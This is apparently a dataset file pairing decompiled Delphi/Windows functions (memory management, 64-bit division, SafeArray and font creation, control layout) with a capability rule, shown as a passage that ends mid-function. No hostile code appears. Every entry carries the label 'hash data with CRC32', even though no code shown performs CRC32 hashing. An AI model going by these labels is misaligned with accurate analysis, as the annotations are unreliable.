{
    "004013f8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nushort fcn.004013f8(void)\n\n{\n    ushort uVar1;\n    uchar auStack72 [40];\n    uint8_t uStack32;\n    ushort uStack28;\n    \n    sub.kernel32.dll_GetStartupInfoA(auStack72);\n    uVar1 = 10;\n    if ((uStack32 & 1) != 0) {\n        uVar1 = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 96
    },
    "00401f9c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00401f9c(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iStack12;\n    \n    uVar1 = *(in_EAX + -4);\n    if ((uVar1 & 0x80000002) != 0x80000002) {\n        *0x4855c8 = 4;\n    }\n    uVar3 = uVar1 & 0x7ffffffc;\n    puVar2 = in_EAX - uVar3;\n    if (((uVar1 ^ *puVar2) & 0xfffffffe) != 0) {\n        *0x4855c8 = 5;\n    }\n    iStack12 = param_1;\n    if ((*puVar2 & 1) != 0) {\n        uVar1 = puVar2[-1];\n        iStack12 = puVar2 - uVar1;\n        if (uVar1 != *(iStack12 + 8)) {\n            *0x4855c8 = 6;\n        }\n        fcn.00401e3c();\n        uVar3 = uVar3 + uVar1;\n    }\n    return CONCAT44(iStack12, uVar3);\n}\n",
        "token_count": 294
    },
    "0040266c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.0040266c(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint32_t *var_8h;\n    uint var_4h;\n    \n    *0x4855c8 = 0;\n    if (*0x4855c4 == '\\0') {\n        puStack28 = 0x40268a;\n        cVar2 = fcn.00401c64();\n        if (cVar2 == '\\0') {\n            *0x4855c8 = 8;\n            return 8;\n        }\n    }\n    uStack32 = 0x402833;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    if (*0x48504d != '\\0') {\n        uStack40 = 0x4855cc;\n        puStack28 = &stack0xfffffffc;\n        sub.kernel32.dll_EnterCriticalSection();\n    }\n    var_8h = in_EAX + -4;\n    uVar4 = *var_8h;\n    if ((uVar4 & 2) == 0) {\n        *0x4855c8 = 9;\n        goto code_r0x0040280a;\n    }\n    *0x4855b4 = *0x4855b4 + -1;\n    *0x4855b8 = *0x4855b8 - ((uVar4 & 0x7ffffffc) - 4);\n    if ((uVar4 & 1) != 0) {\n        uVar1 = *(in_EAX + -8);\n        if ((uVar1 < 0xc) || ((uVar1 & 0x80000003) != 0)) {\n            *0x4855c8 = 10;\n            goto code_r0x0040280a;\n        }\n        var_8h = var_8h - uVar1;\n        if (uVar1 != var_8h[2]) {\n            *0x4855c8 = 10;\n            goto code_r0x0040280a;\n        }\n        uVar4 = uVar4 + uVar1;\n        fcn.00401e3c();\n    }\n    uVar4 = uVar4 & 0x7ffffffc;\n    var_8h = var_8h + uVar4;\n    if (var_8h == *0x485620) {\n        *0x485620 = *0x485620 - uVar4;\n        *0x48561c = *0x48561c + uVar4;\n        if (0x3c00 < *0x48561c) {\n            fcn.00402208();\n        }\n        fcn.0040406c();\n        return 0;\n    }\n    if ((*var_8h & 2) == 0) {\n        if (((var_8h[1] == 0) || (*var_8h == 0)) || (var_8h[2] < 0xc)) {\n            *0x4855c8 = 0xb;\n            goto code_r0x0040280a;\n        }\n        fcn.00401e3c();\n    }\n    else {\n        if ((*var_8h & 0x7ffffffc) < 4) {\n            *0x4855c8 = 0xb;\n            goto code_r0x0040280a;\n        }\n        *var_8h = *var_8h | 1;\n    }\n    fcn.00402110();\ncode_r0x0040280a:\n    uVar3 = 0;\n    *in_FS_OFFSET = uStack40;\n    uStack32 = 0x40283a;\n    if (*0x48504d != '\\0') {\n        uStack36 = 0x4855cc;\n        uVar3 = sub.kernel32.dll_LeaveCriticalSection();\n    }\n    return uVar3;\n}\n",
        "token_count": 941
    },
    "00405444": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00405444(uint param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    \n    if ((param_4 == 0) && ((param_2 == 0 || (param_3 == 0)))) {\n        in_EAX = CONCAT44(param_2, in_EAX) / param_3;\n        param_2 = 0;\n    }\n    else {\n        bVar6 = param_2 < 0;\n        if (bVar6) {\n            bVar4 = in_EAX != 0;\n            in_EAX = -in_EAX;\n            param_2 = -bVar4 - param_2;\n        }\n        if (param_4 < 0) {\n            bVar4 = param_3 != 0;\n            param_3 = -param_3;\n            param_4 = -bVar4 - param_4;\n            bVar6 = !bVar6;\n        }\n        iVar1 = 0x40;\n        uVar3 = 0;\n        uVar2 = 0;\n        do {\n            bVar4 = in_EAX < 0;\n            in_EAX = in_EAX * 2;\n            bVar5 = param_2 < 0;\n            param_2 = param_2 << 1 | bVar4;\n            bVar4 = uVar2 < 0;\n            uVar2 = uVar2 << 1 | bVar5;\n            uVar3 = uVar3 << 1 | bVar4;\n            if ((param_4 <= uVar3) && ((param_4 < uVar3 || (param_3 <= uVar2)))) {\n                bVar4 = uVar2 < param_3;\n                uVar2 = uVar2 - param_3;\n                uVar3 = (uVar3 - param_4) - bVar4;\n                in_EAX = in_EAX + 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n        if (bVar6) {\n            bVar6 = in_EAX != 0;\n            in_EAX = -in_EAX;\n            param_2 = -bVar6 - param_2;\n        }\n    }\n    return CONCAT44(param_2, in_EAX);\n}\n",
        "token_count": 560
    },
    "004054c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004054c0(uint param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    \n    if ((param_4 == 0) && ((param_2 == 0 || (param_3 == 0)))) {\n        uVar2 = CONCAT44(param_2, in_EAX) % param_3;\n        uVar3 = 0;\n    }\n    else {\n        bVar6 = param_2 < 0;\n        if (bVar6) {\n            bVar4 = in_EAX != 0;\n            in_EAX = -in_EAX;\n            param_2 = -bVar4 - param_2;\n        }\n        if (param_4 < 0) {\n            bVar4 = param_3 != 0;\n            param_3 = -param_3;\n            param_4 = -bVar4 - param_4;\n        }\n        iVar1 = 0x40;\n        uVar3 = 0;\n        uVar2 = 0;\n        do {\n            bVar4 = in_EAX < 0;\n            in_EAX = in_EAX * 2;\n            bVar5 = param_2 < 0;\n            param_2 = param_2 << 1 | bVar4;\n            bVar4 = uVar2 < 0;\n            uVar2 = uVar2 << 1 | bVar5;\n            uVar3 = uVar3 << 1 | bVar4;\n            if ((param_4 <= uVar3) && ((param_4 < uVar3 || (param_3 <= uVar2)))) {\n                bVar4 = uVar2 < param_3;\n                uVar2 = uVar2 - param_3;\n                uVar3 = (uVar3 - param_4) - bVar4;\n                in_EAX = in_EAX + 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n        if (bVar6) {\n            bVar6 = uVar2 != 0;\n            uVar2 = -uVar2;\n            uVar3 = -bVar6 - uVar3;\n        }\n    }\n    return CONCAT44(uVar3, uVar2);\n}\n",
        "token_count": 551
    },
    "0040dd94": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dd94(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    uStack44 = 0x40deb7;\n    puStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((arg_ch & 2) == 0) {\n        fcn.00404660();\n        fcn.00404660();\n    }\n    else {\n        puStack40 = &stack0xfffffffc;\n        fcn.00408a18();\n        fcn.00408a18();\n    }\n    fcn.00404660();\n    fcn.004045c8();\n    do {\n        if (var_8h == 0) {\ncode_r0x0040de9c:\n            *in_FS_OFFSET = puStack48;\n            puStack40 = 0x40debe;\n            uStack44 = 0x40deb6;\n            fcn.004045ec();\n            return;\n        }\n        iVar1 = fcn.0040d5a0();\n        if (iVar1 == 0) {\n            fcn.00404890();\n            goto code_r0x0040de9c;\n        }\n        fcn.00404ae8(&fcn.0040dd94::var_14h, *arg_8h);\n        fcn.00404948(var_4h, var_14h);\n        fcn.00404888(&fcn.0040dd94::var_10h);\n        fcn.00404ae8();\n        if ((arg_ch & 1) == 0) {\n            fcn.00404890();\n            goto code_r0x0040de9c;\n        }\n        puStack48 = &fcn.0040dd94::var_8h;\n        fcn.00404888();\n        fcn.00404ae8();\n    } while( true );\n}\n",
        "token_count": 529
    },
    "00415c9c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: vt\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00415c9c(uint16_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint32_t in_EDX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint rgsabound;\n    int32_t aiStack524 [127];\n    int32_t var_ch;\n    int32_t cDims;\n    uint vt;\n    \n    if (((in_EDX & 1) != 0) && (in_EDX < 0x80)) {\n        cVar1 = fcn.00415e4c();\n        if (cVar1 != '\\0') goto code_r0x00415ccb;\n    }\n    fcn.0040fe68();\ncode_r0x00415ccb:\n    iVar3 = in_EDX + 1 >> 1;\n    if (iVar3 < 0) {\n        iVar3 = iVar3 + ((in_EDX + 1 & 1) != 0);\n    }\n    cDims = iVar3;\n    if (-1 < iVar3 + -1) {\n        piVar2 = &rgsabound;\n        do {\n            piVar2[1] = *in_EAX;\n            *piVar2 = (in_EAX[1] - piVar2[1]) + 1;\n            in_EAX = in_EAX + 2;\n            piVar2 = piVar2 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    var_ch = sub.oleaut32.dll_SafeArrayCreate(vt, cDims, &rgsabound);\n    if (var_ch == 0) {\n        fcn.0040fe68();\n    }\n    fcn.004104c0();\n    *arg_8h = vt | 0x2000;\n    *(arg_8h + 4) = var_ch;\n    return;\n}\n",
        "token_count": 451
    },
    "00420298": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420298(int32_t arg_8h)\n\n{\n    if (((*(arg_8h + -9) & 1) == 0) && (*(arg_8h + -0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 69
    },
    "0042056c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042056c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x42078d;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x4205a2;\n    (**(*in_EAX + 0x24))();\n    puStack72 = 0x4205ad;\n    fcn.00421830();\n    puStack72 = 0x4205b8;\n    fcn.00421830();\n    iVar1 = in_EAX[0xb];\n    iVar2 = in_EAX[7];\n    uStack76 = 0x42075d;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    if (param_2 == NULL) {\n        if ((var_9h & 1) == 0) {\n            uStack88 = 0x4205f9;\n            puStack72 = &stack0xfffffffc;\n            fcn.00420318(&stack0xfffffffc);\n        }\n        else {\n            uStack88 = 0x4205f0;\n            puStack72 = &stack0xfffffffc;\n            fcn.004204c8(&stack0xfffffffc);\n        }\n    }\n    if (param_2 != NULL) {\n        uStack88 = 0x42071b;\n        uStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        fcn.004201b8(&stack0xfffffffc);\n        *(param_2 + 7) = *(param_2 + 7) | 1;\n        fcn.00420230(&stack0xfffffffc);\n        if ((var_9h & 1) == 0) {\n            fcn.00420428(&stack0xfffffffc);\n        }\n        if (param_2 == NULL) {\n            *in_FS_OFFSET = uStack92;\n            fcn.0040406c();\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x420794;\n            uStack76 = 0x42077e;\n            fcn.004045ec();\n            uStack76 = 0x42078c;\n            fcn.00405b44();\n            return;\n        }\n        if ((*(param_2 + 0x1d) & 2) != 0) {\n            in_EAX[7] = param_2;\n        }\n        *(param_2 + 7) = *(param_2 + 7) | 2;\n        fcn.00420230(&stack0xfffffffc);\n        (**(*param_2 + 0x14))();\n        *(param_2 + 7) = *(param_2 + 7) & 0xfffd;\n        fcn.00420230(&stack0xfffffffc);\n        if ((var_9h & 2) != 0) {\n            fcn.00403a28();\n        }\n        if (((var_9h & 1) == 0) && ((*(param_2 + 0x1d) & 2) == 0)) {\n            fcn.0042017c(&stack0xfffffffc);\n            fcn.0041c358();\n        }\n        else {\n            iVar3 = fcn.0041c52c();\n            if (iVar3 < 0) {\n                fcn.0042017c(&stack0xfffffffc);\n                fcn.0041c358();\n            }\n        }\n        *in_FS_OFFSET = uStack92;\n    }\n    *in_FS_OFFSET = uStack80;\n    in_EAX[0xb] = iVar1;\n    in_EAX[7] = iVar2;\n    return;\n}\n",
        "token_count": 1008
    },
    "00422984": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00422984(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    while (*(in_EAX + 0x10) != 0) {\n        piVar1 = fcn.0041c5b8();\n        if (((*(piVar1 + 0x1d) & 1) == 0) && (*0x4229d8 != (*0x4229d8 & *(in_EAX + 0x1c)))) {\n            fcn.004228cc();\n        }\n        else {\n            fcn.0042294c();\n        }\n        (**(*piVar1 + -4))();\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "0042614c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0042614c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStack112;\n    int32_t iStack108;\n    uint uStack104;\n    uchar *puStack100;\n    int32_t iStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint var_24h;\n    int32_t var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    uStack92 = 0x4262d5;\n    iStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack100 = 0x42618b;\n        fcn.0042546c();\n        uStack104 = 0x4262ad;\n        iStack108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStack100 = &stack0xfffffffc;\n        if (*(var_4h + 8) == 0) {\n            var_40h = *(var_4h + 0x14);\n            var_3ch = 0;\n            var_38h = 0;\n            var_34h = 0;\n            if ((*(var_4h + 0x19) & 1) == 0) {\n                var_30h = 400;\n            }\n            else {\n                var_30h = 700;\n            }\n            var_2ch._0_1_ = (*(var_4h + 0x19) & 2) != 0;\n            var_2ch._1_1_ = (*(var_4h + 0x19) & 4) != 0;\n            var_2ch._2_1_ = (*(var_4h + 0x19) & 8) != 0;\n            var_2ch._3_1_ = *(var_4h + 0x1a);\n            puStack100 = &stack0xfffffffc;\n            fcn.0040482c();\n            iVar2 = fcn.00408ab8();\n            if (iVar2 == 0) {\n                fcn.0040482c();\n                fcn.00409324();\n            }\n            else {\n                fcn.0040482c();\n                fcn.00409324();\n            }\n            var_26h = 0;\n            var_28h = 0;\n            var_27h = 0;\n            cVar1 = fcn.00426430();\n            if (cVar1 == '\\x01') {\n                var_25h = 2;\n            }\n            else if (cVar1 == '\\x02') {\n                var_25h = 1;\n            }\n            else {\n                var_25h = 0;\n            }\n            puStack112 = &fcn.0042614c::var_40h;\n            uVar3 = sub.gdi32.dll_CreateFontIndirectA();\n            *(var_4h + 8) = uVar3;\n        }\n        *in_FS_OFFSET = puStack112;\n        uStack104 = 0x4262b4;\n        iStack108 = 0x4262ac;\n        fcn.00425478();\n        return;\n    }\n    *in_FS_OFFSET = iStack96;\n    puStack88 = 0x4262dc;\n    uStack92 = 0x4262d4;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 910
    },
    "00427120": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427120(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    param_2 = ~*(in_EAX + 2) & param_2;\n    if (*0x427190 != param_2) {\n        if ((param_2 & 1) != 0) {\n            (**(*in_EAX + 0x14))();\n            if (in_EAX[1] == 0) {\n                fcn.0040c998();\n                fcn.00403fc0();\n            }\n        }\n        if ((param_2 & 2) != 0) {\n            fcn.004271bc();\n        }\n        if ((param_2 & 4) != 0) {\n            fcn.004271e8();\n        }\n        if ((param_2 & 8) != 0) {\n            fcn.00427218();\n        }\n        *(in_EAX + 2) = param_2 | *(in_EAX + 2);\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0043cbbc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043cbbc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00403820();\n        *(in_EAX + 0x6c) = 0;\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) & 0xffff7fff;\n    }\n    else {\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) | 0x8000;\n        if (*(in_EAX + 0x6c) == 0) {\n            iVar1 = fcn.00403a28();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x6c) = uVar2;\n        }\n        (**(**(in_EAX + 0x6c) + 0xc))();\n        iVar1 = *(in_EAX + 0x6c);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x43f820;\n        fcn.00403a28();\n        fcn.0042280c();\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "0043cd5c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043cd5c(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = *(in_EAX + 0x5b);\n    if (param_2 != cVar1) {\n        *(in_EAX + 0x5b) = param_2;\n        fcn.0043cb9c();\n        if (((*(in_EAX + 7) & 1) == 0) &&\n           (((((*(in_EAX + 7) & 0x10) == 0 || (in_EAX[0xc] != 0)) && (param_2 != '\\x06')) && (cVar1 != '\\x06')))) {\n            if ((((cVar1 - 1U < 2 == param_2 - 3U < 2) && (cVar1 != '\\0')) && (cVar1 != '\\x05')) &&\n               ((param_2 != '\\0' && (param_2 != '\\x05')))) {\n                (**(*in_EAX + 0x84))(in_EAX[0x12], in_EAX[0x13]);\n            }\n            else {\n                fcn.00403a28();\n            }\n        }\n    }\n    fcn.00403a28();\n    return;\n}\n",
        "token_count": 296
    },
    "0043ce04": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ce04(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    cVar1 = fcn.0043ef94();\n    if ((cVar1 != '\\0') &&\n       ((((in_EDX != in_EAX[0x10] || (in_ECX != in_EAX[0x11])) || (arg_ch != in_EAX[0x12])) || (arg_8h != in_EAX[0x13]))\n       )) {\n        fcn.0043dc90();\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        fcn.0043ce9c();\n        (**(*in_EAX + 0x7c))();\n        fcn.0043e9fc(0);\n        fcn.00403a28();\n        if ((*(in_EAX + 7) & 1) == 0) {\n            fcn.00403a28();\n        }\n    }\n    return;\n}\n",
        "token_count": 288
    },
    "0043ce9c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0043ce9c(void)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uStack16;\n    uint uStack12;\n    \n    if ((*(in_EAX + 0x62) == '\\0') && ((*(in_EAX + 0x1c) & 1) == 0)) {\n        uVar1 = *(in_EAX + 0x61);\n        if (*0x43cfb4 == uVar1) {\n            *(in_EAX + 0x90) = 0;\n            *(in_EAX + 0x94) = 0;\n        }\n        else {\n            if ((uVar1 & 4) == 0) {\n                iVar3 = *(in_EAX + 0x48) >> 1;\n                if (iVar3 < 0) {\n                    iVar3 = iVar3 + ((*(in_EAX + 0x48) & 1) != 0);\n                }\n                *(in_EAX + 0x88) = iVar3 + *(in_EAX + 0x40);\n            }\n            else if ((uVar1 & 1) == 0) {\n                *(in_EAX + 0x88) = *(in_EAX + 0x40);\n            }\n            else {\n                *(in_EAX + 0x88) = *(in_EAX + 0x48);\n            }\n            if ((uVar1 & 8) == 0) {\n                iVar3 = *(in_EAX + 0x4c) >> 1;\n                if (iVar3 < 0) {\n                    iVar3 = iVar3 + ((*(in_EAX + 0x4c) & 1) != 0);\n                }\n                *(in_EAX + 0x8c) = iVar3 + *(in_EAX + 0x44);\n            }\n            else if ((uVar1 & 2) == 0) {\n                *(in_EAX + 0x8c) = *(in_EAX + 0x44);\n            }\n            else {\n                *(in_EAX + 0x8c) = *(in_EAX + 0x4c);\n            }\n            iVar3 = *(in_EAX + 0x30);\n            if (iVar3 != 0) {\n                if ((*(iVar3 + 0x1c) & 2) == 0) {\n                    cVar2 = fcn.00444380();\n                    if (cVar2 == '\\0') {\n                        *(in_EAX + 0x90) = *(*(in_EAX + 0x30) + 0x48);\n                        *(in_EAX + 0x94) = *(*(in_EAX + 0x30) + 0x4c);\n                    }\n                    else {\n                        (**(**(in_EAX + 0x30) + 0x44))();\n                        *(in_EAX + 0x90) = uStack16;\n                        *(in_EAX + 0x94) = uStack12;\n                    }\n                }\n                else if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n                    *(in_EAX + 0x90) = *(iVar3 + 0x1fa);\n                    *(in_EAX + 0x94) = *(iVar3 + 0x1fe);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 766
    },
    "0043d1b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d1b0(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x150) = 1;\n    }\n    *(in_EAX + 0x158) = param_2;\n    return;\n}\n",
        "token_count": 93
    },
    "0043d1c4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0043d1c4(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x150) = 0;\n    }\n    fcn.0040461c();\n    return;\n}\n",
        "token_count": 76
    },
    "0043d464": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d464(int32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    bool bVar4;\n    int32_t in_stack_ffffffd4;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    \n    if (param_2 != param_1) {\n        uVar1 = *0x43d608;\n        if ((*(in_EAX + 7) & 1) != 0) {\n            uVar1 = *(in_EAX + 0x26);\n        }\n        if ((uVar1 & 1) != 0) {\n            in_stack_ffffffd4 = in_EAX[0x10];\n            in_stack_ffffffdc = param_1;\n            sub.kernel32.dll_MulDiv(in_stack_ffffffd4, param_2, param_1);\n        }\n        if ((uVar1 & 2) != 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n        }\n        if (((uVar1 & 4) == 0) || ((*(in_EAX + 0x51) & 1) != 0)) {\n            in_stack_ffffffdc = in_EAX[0x12];\n        }\n        else if ((uVar1 & 1) == 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        else {\n            sub.kernel32.dll_MulDiv(in_EAX[0x10] + in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        bVar4 = (uVar1 & 8) == 0;\n        if ((bVar4) || ((*(in_EAX + 0x51) & 2) != 0)) {\n            iStack32 = in_EAX[0x13];\n        }\n        else {\n            iStack32 = param_1;\n            if (bVar4) {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n            }\n            else {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11] + in_EAX[0x13], param_2, in_stack_ffffffd4);\n            }\n        }\n        (**(*in_EAX + 0x84))(iStack32, in_stack_ffffffdc);\n        if (*0x43d610 != (uVar1 & *0x43d60c)) {\n            iVar2 = sub.kernel32.dll_MulDiv(in_EAX[0x24], param_2, iStack32);\n            in_EAX[0x24] = iVar2;\n        }\n        if (*0x43d610 != (uVar1 & *0x43d614)) {\n            iVar2 = sub.kernel32.dll_MulDiv(in_EAX[0x25], param_2, iStack32);\n            in_EAX[0x25] = iVar2;\n        }\n        if ((*(in_EAX + 0x59) == '\\0') && ((uVar1 & 0x10) != 0)) {\n            uVar3 = fcn.004263bc(param_2, iStack32);\n            sub.kernel32.dll_MulDiv(uVar3);\n            fcn.004263d8();\n        }\n    }\n    *(in_EAX + 0x26) = *0x43d610;\n    return;\n}\n",
        "token_count": 805
    },
    "0043d630": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0043d630(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uchar *puVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x43d6c6;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar3 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x50) & 0x20) != 0) && (uVar5 = (*(in_EAX + 0x1c) & 1) == 0,  puVar3 = &stack0xfffffffc,  uVar5)) {\n        fcn.0043d848();\n        fcn.004049d4();\n        puVar3 = puStack28;\n        if (uVar5) {\n            iVar1 = *(in_EAX + 4);\n            if (iVar1 != 0) {\n                cVar4 = fcn.004039b8();\n                if ((cVar4 != '\\0') && (puVar3 = puStack28,  (*(iVar1 + 0x1c) & 1) != 0)) goto code_r0x0043d692;\n            }\n            bVar2 = true;\n            goto code_r0x0043d698;\n        }\n    }\ncode_r0x0043d692:\n    puStack28 = puVar3;\n    bVar2 = false;\ncode_r0x0043d698:\n    fcn.00422c94();\n    if (bVar2) {\n        fcn.0043d878();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x43d6cd;\n    uStack32 = 0x43d6c5;\n    